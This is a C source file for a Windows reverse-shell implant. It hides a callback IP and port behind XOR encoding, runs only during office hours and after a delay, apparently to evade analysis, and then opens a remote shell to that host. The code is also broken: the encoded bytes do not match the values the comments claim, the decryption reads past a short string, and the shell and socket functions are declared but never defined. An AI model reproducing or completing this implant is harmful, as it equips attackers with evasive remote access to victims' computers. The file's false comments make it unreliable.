// main.c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <time.h>

#define XOR_KEY 0xAA  // Simple XOR key for encryption/decryption

// Function declarations
SOCKET create_socket(const char *ip_addr, int port);
void create_reverse_shell(SOCKET sock);

// Simple XOR encryption/decryption function
void xor_encrypt_decrypt(char *input, char *output, size_t length) {
    for (size_t i = 0; i < length; i++) {
        output[i] = input[i] ^ XOR_KEY; // XOR encryption/decryption
    }
}

int main() {
    char *encrypted_ip = "\x1A\x1C\x10\x0D\x03"; // XOR encrypted "10.0.2.15"
    char *encrypted_port = "\x0B\x06\x0E\x05";   // XOR encrypted "9001"
    
    // Buffers for decrypted values
    char decrypted_ip[16];
    char decrypted_port[6];

    // Decrypt the IP address and port
    xor_encrypt_decrypt(encrypted_ip, decrypted_ip, 15);
    xor_encrypt_decrypt(encrypted_port, decrypted_port, 4);
    
    decrypted_ip[15] = '\0';  // Null-terminate the IP string
    decrypted_port[5] = '\0';  // Null-terminate the port string

    // Conditional execution: Get current hour
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    
    // Define valid hour range (for example, between 9 AM and 5 PM)
    int start_hour = 9;
    int end_hour = 17;

    // Check if current hour is within the valid range
    if (tm.tm_hour >= start_hour && tm.tm_hour < end_hour) {
        // Delay execution for 5 seconds (5000 milliseconds)
        Sleep(5000);

        // Step 1: Create socket
        SOCKET sock = create_socket(decrypted_ip, atoi(decrypted_port));
        if (sock == INVALID_SOCKET) {
            return 1;
        }

        // Step 2: Launch reverse shell
        create_reverse_shell(sock);

        // Clean up
        closesocket(sock);
        WSACleanup();
    } else {
        printf("Execution conditions not met. Exiting...\n");
    }

    return 0;
}
